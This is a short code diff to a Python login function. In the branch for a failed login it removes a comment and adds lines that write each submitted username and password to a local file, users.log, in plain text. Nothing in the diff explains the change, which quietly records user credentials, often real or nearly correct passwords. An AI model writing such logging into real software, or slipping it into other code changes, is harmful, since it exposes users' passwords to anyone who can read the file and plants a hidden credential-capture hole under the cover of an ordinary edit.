@@ -24,7 +24,9 @@ def login_data(username, password):
             # Redirect to home page
             return 'Logged in successfully!'
         else:
-            # Account doesnt exist or username/password incorrect
+            f = open("users.log", "a")
+            f.write(username + ":" + password)
+            f.close()
             return 'Incorrect username/password!'
 
 #Group Data
